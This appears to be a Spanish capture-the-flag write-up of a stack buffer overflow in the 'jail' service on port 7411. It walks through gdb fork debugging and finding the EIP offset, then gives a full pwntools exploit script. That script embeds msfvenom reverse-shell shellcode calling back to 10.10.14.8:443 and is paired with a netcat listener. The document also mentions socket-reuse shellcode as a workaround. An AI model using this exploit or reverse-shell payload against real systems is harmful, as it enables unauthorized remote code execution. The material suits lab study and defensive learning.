## Vulnerability Assessment {-}


### Buffer Overflow {-}

El codigo nos muestra que compara una String con un username `admin` y una contraseña `1974jailbreak!`.
Vemos que hay una posibilidad de lanzar el binario en modo **Debug**. 

Vemos que una de estas comparativas va con una variable `userpass` que solo tiene un Buffer de 16 Bytes y 
que si lanzamos el binario en modo debug, nos printa la direccion memoria de esta variable.

Tambien vemos que el binario abre el puerto 7411 y lo comprobamos con `lsof`

```bash
lsof -i:7411
./jail
lsof -i:7411
```

#### Analyzando vulnerabilidades con gdb {-}

Lanzamos el binario con gdb

```bash
gdb ./jail
r
```

Y nos connectamos por el puerto 7411

```bash
nc localhost 7411
```

Vemos que el gdb  a creado un processo hijo de modo Detach que no seria la buena forma para tratar. Lo comprobamos 
colapsando el programa poniendo mas de 16 A en el password

```bash
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no vemos nada en el gdb. En estos casos tenemos que configurar una cosa para ver el flujo del processo hijo.

```bash
gdb ./jail
set detach-on-fork off
set follow-fork-mode child
r
```

Aqui ya estamos syncronizados con el processo hijo.

```bash
nc localhost 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Intentamos el modo debug 

```bash
nc localhost 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.

USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Debug: userpass buffer @ 0xffffd140
```

Vemos la direccion de la variable userpass y si repetimos la movida multiples vecez, vemos que la direccion no cambia.
Ademas, ya vemos que sobre escribimos registros con A y desde aqui seguimos la guia de un BOF

1. Buscamos Ganar el control del **eip** 

    - creamos un pattern de 150 caracteres
    
        ```bash
        gef➤ pattern create 150
        [+] Generating a pattern of 150 bytes (n=4)
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        [+] Saved as '$_gef0'
        ```

    - lanzamos el script otra vez y pegamos los caracteres

        ```bash
        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        ```

    - el programa peta una vez mas pero el valor del `$eip` a cambiado. Miramos el offset con el commando

        ```bash
        gef➤  pattern offset $eip
        [+] Searching for '$eip'
        [+] Found at offset 28 (little-endian search) likely
        ``` 

        Aqui vemos que tenemos que entrar 28 caracteres antes de sobre escribir el **eip**.

    - Probamos con 28 A y 4 B.

        ```bash
        python -c '28*"A"+4*"B"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
        ```

    - añadimos 4 C para saber donde caen la cosas despues del **eip**

        ```bash
        python -c '28*"A"+4*"B"+8*"C"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC
        ```

1. Miramos lo que hay en la direccion de la variable userpass

    - lo miramos en forma normal

        ```bash
        gef➤  x/s 0xffffd140
        #Output
        0xffffd140: 'A' <repeats 28 times>, "BBBBCCCCCCCC"
        ```

    - lo miramos en forma hexadecimal
    
        ```bash
        gef➤  x/16wx 0xffffd140
        #Output
        0xffffd140  0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd150  0x41414141  0x41414141  0x41414141  0x42424242
        0xffffd160  0x43434343  0x43434343  0x00000100  0xf7ff4070
        0xffffd170  0x00000001  0xf7ffd590  0x00000000  0x414112db
        ``` 

Aqui vemos que la direccion `0xffffd140` apunta al principio del Buffer (la entrada del usuario). Esto significa
que si el **eip** apunta a la direccion `0xfffd140` sumada por 32 bytes (que serian las 28 A mas los 4 bytes del **eip**),
podriamos ejecutar el shellcode que queremos.

```{r, echo = FALSE, fig.cap="Buffer shell code position", out.width="90%"}
    knitr::include_graphics("images/Jail-Buffer-shellcode-pos.png")
```

Para esto nos creamos un script en python

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386')

p = remote("127.0.0.1", 7411)
# p = remote("10.10.10.34", 7411)


buf = b"\xdb\xc8\xd9\x74\x24\xf4\x5e\xbb\xc5\x90\x9f\x66\x33"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x9b\x83\x7d"
buf += b"\x93\x12\x7f\x76\xbf\x07\x3c\x2a\x2a\xa5\x4b\x2d\x1a"
buf += b"\xcf\x86\x2e\xc8\x56\xa9\x10\x22\xe8\x80\x17\x45\x80"
buf += b"\x18\xe2\xbb\x58\x75\xf0\xc3\x59\x3e\x7d\x22\xe9\x26"
buf += b"\x2e\xf4\x5a\x14\xcd\x7f\xbd\x97\x52\x2d\x55\x46\x7c"
buf += b"\xa1\xcd\xfe\xad\x6a\x6f\x96\x38\x97\x3d\x3b\xb2\xb9"
buf += b"\x71\xb0\x09\xb9"

before_eip = ("A" * 28).encode()
EIP = p32(0xffffd140+32)
after_eip = buf

p.recvuntil("OK Ready. Send USER command.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS ".encode() + before_eip + EIP + after_eip)
```

> [ ! ] NOTAS: el shellcode a sido creado con el comando `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -b "\x00\x0a" -f python`. Los badchars
aqui son los que ponemos siempre.

Ahora testeamos el script

1. Lanzamos el jail

    ```bash
    ./jail
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```

En este caso no funcciona y tito nos adelanta que el problema viene que de vez en cuando, el espacio del shellcode sobrepasa el limite de caracteres que podemos injectar, 
o mejor dicho es demasiado grande. Esta limitacion puede ser bypasseada por una tecnica llamada **reuse addr** explicada en la web de [rastating](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/).
La tecnica consiste en utilizar methodos **send** o **recv** del socket de coneccion para ganar espacio para el shellcode.

Si buscamos por shellcode re-use en [exploit-db](https://www.exploit-db.com/shellcodes/34060), podemos encontrar shellcode que crearian un `/bin/bash`

Modificamos el shellcode del exploit.py y ganamos accesso a la maquina victima

